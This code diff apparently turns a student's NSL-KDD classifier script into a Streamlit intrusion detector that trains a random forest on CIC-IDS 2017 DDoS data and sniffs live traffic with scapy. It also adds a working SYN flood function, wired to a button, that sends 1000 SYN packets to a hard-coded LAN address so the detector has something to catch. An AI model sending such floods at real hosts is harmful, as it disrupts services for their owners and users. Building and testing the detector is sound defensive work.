@@ -1,80 +1,200 @@
+import streamlit as st
+from scapy.all import sniff, send
+from scapy.layers.inet import IP, TCP, UDP
 import pandas as pd
-from sklearn.model_selection import train_test_split
 from sklearn.ensemble import RandomForestClassifier
+import threading
+import time
+from collections import defaultdict
+import random
 
-url = "https://raw.githubusercontent.com/defcom17/NSL_KDD/master/KDDTrain+.txt"
-columns = ["duration", "protocol_type", "service", "flag", "src_bytes", "dst_bytes", "land", "wrong_fragment", "urgent", "hot",
-           "num_failed_logins", "logged_in", "num_compromised", "root_shell", "su_attempted", "num_root", "num_file_creations",
-           "num_shells", "num_access_files", "num_outbound_cmds", "is_host_login", "is_guest_login", "count", "srv_count",
-           "serror_rate", "srv_serror_rate", "rerror_rate", "srv_rerror_rate", "same_srv_rate", "diff_srv_rate", "srv_diff_host_rate",
-           "dst_host_count", "dst_host_srv_count", "dst_host_same_srv_rate", "dst_host_diff_srv_rate", "dst_host_same_src_port_rate",
-           "dst_host_srv_diff_host_rate", "dst_host_serror_rate", "dst_host_srv_serror_rate", "dst_host_rerror_rate", "dst_host_srv_rerror_rate", "label"]
-
-print(len(columns))
-
-dataset = pd.read_csv(url, names=columns)
-
-relevant_columns = ["duration", "protocol_type", "src_bytes", "dst_bytes", "flag", "count", "srv_count", "same_srv_rate", "diff_srv_rate", "srv_diff_host_rate", "label"]
-dataset = dataset[relevant_columns]
-
-dataset.dropna(inplace=True)
-
-dataset.drop_duplicates(inplace=True)
-
-if dataset['duration'].dtype == 'object':
-    dataset['duration'] = pd.to_numeric(dataset['duration'], errors='coerce')
-
-categorical_cols = ["protocol_type", "flag"]
-for col in categorical_cols:
-    dataset[col] = pd.factorize(dataset[col])[0]
-
-X = dataset.drop(columns=["label"], axis=1)
-Y = dataset["label"]
-
-X_train, X_test, Y_train, Y_test = train_test_split(X, Y, test_size=0.2, random_state=42)
-
-model_RF = RandomForestClassifier(n_estimators=100)
-model_RF.fit(X_train, Y_train)
-
-score = model_RF.score(X_test, Y_test)
-print("Score du modèle :", score)
+# ===================== Session =====================
+if 'alerts' not in st.session_state:
+    st.session_state.alerts = []
+if 'monitor_started' not in st.session_state:
+    st.session_state.monitor_started = False
 
 
-def classifier(model, **kwargs):
-    feature_names = X.columns
+# ===================== Chargement et entraînement =====================
+@st.cache_resource
+def train_model_cic():
+    file_path = "./Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv"
+    df = pd.read_csv(file_path)
+    df.columns = df.columns.str.strip()  # Nettoyage des noms de colonnes
+    print(df['Label'].unique())
 
-    default_values = X.mean().to_dict()
+    cols = [
+        "Flow Duration",
+        "Total Fwd Packets",
+        "Total Backward Packets",
+        "Total Length of Fwd Packets",
+        "Total Length of Bwd Packets",
+        "Label"
+    ]
+    df = df[cols]
 
-    input_data = {feature: kwargs.get(feature, default_values.get(feature, 0)) for feature in feature_names}
+    df.dropna(inplace=True)
+    df.drop_duplicates(inplace=True)
 
-    x = pd.DataFrame([input_data], columns=feature_names)
+    df = df[df['Label'].isin(['BENIGN', 'DoS Hulk', 'DDoS'])]
+    df['Label'] = df['Label'].apply(lambda x: 'attack' if x != 'BENIGN' else 'normal')
 
-    prediction = model.predict(x)
-    print("Prédiction :", prediction)
-    return prediction
+    X = df.drop(columns=['Label'])
+    Y = df['Label']
+
+    model = RandomForestClassifier(n_estimators=100)
+    model.fit(X, Y)
+
+    return model, X.columns.tolist()
 
 
-classifier(model_RF, duration=1, src_bytes=500)
+model, feature_names = train_model_cic()
 
 
-from scapy.all import sniff
+# ===================== Prédiction =====================
+def predict(model, features):
+    try:
+        df = pd.DataFrame([features], columns=feature_names)
+        prediction = model.predict(df)[0]
+        return prediction
+    except Exception as e:
+        st.session_state.alerts.append(f"⚠️ Erreur dans la prédiction : {str(e)}")
+        return None
 
-# Capture un seul paquet et extrait les informations pertinentes
+
+# ===================== Scapy =====================
+connection_data = defaultdict(lambda: {
+    "start_time": None,
+    "fwd_packets": 0,
+    "bwd_packets": 0,
+    "fwd_bytes": 0,
+    "bwd_bytes": 0,
+})
+alert_buffer = []
+
+
 def process_packet(packet):
-    data = {
-        "duration": 1,  # La durée peut être estimée ou remplacée par une valeur par défaut
-        "protocol_type": packet.proto,  # Numéro du protocole (ex. 6 = TCP, 17 = UDP)
-        "src_bytes": len(packet),  # Taille totale du paquet
-        "dst_bytes": 0,  # Peut être 0 si on ne connaît pas la réponse
-        "flag": 0,  # Les flags TCP nécessitent une extraction plus fine
-        "count": 1,  # Nombre de connexions (simulé)
-        "srv_count": 1,  # Nombre de connexions au même service
-        "same_srv_rate": 0.5,  # Valeur par défaut
-        "diff_srv_rate": 0.5,  # Valeur par défaut
-        "srv_diff_host_rate": 0.5,  # Valeur par défaut
-    }
-    prediction = classifier(model_RF, **data)
-    print("Prédiction du paquet capturé :", prediction)
+    try:
+        if IP in packet:
+            src = packet[IP].src
+            dst = packet[IP].dst
 
-# Capture un paquet et applique le classificateur
-sniff(count=1, prn=process_packet)
+            # Filtrage des adresses multicast (224.0.0.0 à 239.255.255.255)
+            if dst.startswith("224.") or dst.startswith("239."):
+                return
+
+            key = (src, dst)
+
+            if connection_data[key]["start_time"] is None:
+                connection_data[key]["start_time"] = time.time()
+
+            length = len(packet)
+            if packet[IP].src == key[0]:  # Forward
+                connection_data[key]["fwd_packets"] += 1
+                connection_data[key]["fwd_bytes"] += length
+            else:  # Backward
+                connection_data[key]["bwd_packets"] += 1
+                connection_data[key]["bwd_bytes"] += length
+
+            duration = (time.time() - connection_data[key]["start_time"]) * 1_000_000  # µs
+
+            # Ignorer les flux trop courts ou trop petits
+            if duration < 1000 or (connection_data[key]["fwd_packets"] + connection_data[key]["bwd_packets"]) < 5:
+                return
+
+            features = {
+                "Flow Duration": duration,
+                "Total Fwd Packets": connection_data[key]["fwd_packets"],
+                "Total Backward Packets": connection_data[key]["bwd_packets"],
+                "Total Length of Fwd Packets": connection_data[key]["fwd_bytes"],
+                "Total Length of Bwd Packets": connection_data[key]["bwd_bytes"],
+            }
+
+            prediction = predict(model, features)
+            if prediction == "attack":
+                alert_buffer.append(f"🚨 ATTACK DETECTED from {src} to {dst}")
+    except Exception as e:
+        alert_buffer.append(f"⚠️ Erreur : {str(e)}")
+
+
+def start_sniffing():
+    while True:
+        sniff(filter="ip", prn=process_packet, store=False)
+
+
+# ===================== Simuler une fausse attaque =====================
+
+def get_real_attack_sample():
+    df = pd.read_csv("./Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv")
+    df.columns = df.columns.str.strip()
+    df = df[df['Label'] == 'DDoS']
+    df = df[[
+        "Flow Duration",
+        "Total Fwd Packets",
+        "Total Backward Packets",
+        "Total Length of Fwd Packets",
+        "Total Length of Bwd Packets"
+    ]]
+    df.dropna(inplace=True)
+    return df.iloc[0].to_dict()
+
+
+# ===================== Attaque SYN Flood =====================
+def send_syn_flood(target_ip, target_port, num_packets=1000):
+    for _ in range(num_packets):
+        ip = IP(dst=target_ip)
+        syn = TCP(dport=target_port, flags="S", seq=random.randint(1, 65535))
+        packet = ip/syn
+        send(packet)
+    print(f"Attaque SYN Flood envoyée vers {target_ip}:{target_port}")
+
+
+# ===================== Interface Streamlit =====================
+st.title("🛡️ Jeanne d'Arc - Détection d'attaques réseau (CIC-IDS 2017)")
+
+if st.button("🚀 Démarrer la surveillance") and not st.session_state.monitor_started:
+    st.session_state.monitor_started = True
+    threading.Thread(target=start_sniffing, daemon=True).start()
+    st.success("Surveillance en cours...")
+
+if st.button("Simuler une fausse attaque"):
+    print("attaque envoyer")
+    fake_attack_data = get_real_attack_sample()
+    prediction = predict(model, fake_attack_data)
+    if prediction == "attack":
+        alert_buffer.append(f"🚨 SIMULATION ATTACK DETECTED")
+    print(prediction)
+
+    if prediction == "attack":
+        st.success("✅ Simulation : L'attaque a été détectée !")
+    else:
+        st.error("❌ Simulation : Aucune attaque détectée.")
+
+# Envoi d'attaque SYN Flood avec des données brutes
+def send_real_syn_flood():
+    # Adresse IP cible et port définis en dur
+    target_ip = "192.168.1.194"
+    target_port = 80
+    num_packets = 1000  # Nombre de paquets envoyés
+    send_syn_flood(target_ip, target_port, num_packets)
+
+if st.button("Envoyer une attaque SYN Flood (données brutes)"):
+    send_real_syn_flood()
+
+alert_area = st.empty()
+
+# Boucle d'affichage continue
+while True:
+    if alert_buffer:
+        st.session_state.alerts.extend(alert_buffer)
+        alert_buffer.clear()
+
+    with alert_area.container():
+        with st.expander("🔔 Dernières alertes", expanded=True):
+            for alert in st.session_state.alerts[-10:][::-1]:
+                if "ATTACK" in alert:
+                    st.error(alert)
+                else:
+                    st.success(alert)
+
+    time.sleep(1)
